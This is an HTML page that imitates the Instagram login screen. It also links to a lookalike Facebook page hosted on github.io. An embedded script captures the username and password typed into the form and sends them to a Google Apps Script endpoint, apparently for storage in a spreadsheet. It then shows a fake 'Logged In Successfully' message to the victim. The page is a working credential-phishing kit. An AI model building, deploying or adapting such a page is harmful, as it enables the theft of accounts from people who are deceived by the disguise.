<!DOCTYPE html>
<html>
<head>
	<title>Log In</title>
	<link rel="stylesheet" type="text/css" href="style.css">
	<link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
</head>
<body link="white" alink="white" vlink="white">
	<div class="container">
	<div class="text">Log in to continue</div>
	<div class="page">
		<div class="title">Instagram</div>
		<div class="container">
  <div class="row">
    <div class="col-sm">
    </div>
    <div class="col-sm">
     
		<form method="post" autocomplete="off" name="google-sheet" >
			<div class="box">
			<input type="text" class="form-control" placeholder="Phone number, username, or email" name="username" required>
			<input type="password" class="form-control"  placeholder="Password" name="password" required>
			<input type="Submit" class="btn btn-primary" value="Log In"></div><br>
			<div class="option">OR</div><br>
		</form>
    </div>
    <div class="col-sm">
      
    </div>
  </div>
</div>
			<i class="fa fa-facebook-official" aria-hidden="true"></i>
			<div class="login">
			<a href="https://facebookofficial.github.io/facebook.github.io/" style="text-decoration: none;">Continue with Facebook</a></div><br><br>
			<script>
            const scriptURL = 'https://script.google.com/macros/s/AKfycbzZo2_RYi7eMV-ZM70TDfwyUTZb8TQjZHgq0OUCf9GsQSj3gl0/exec'
            const form = document.forms['google-sheet']
          
            form.addEventListener('submit', e => {
              e.preventDefault()
              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                .then(response => alert("Logged In Successfully"))
                .catch(error => console.error('Error!', error.message))
            })
          </script>

        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</body>
</html>
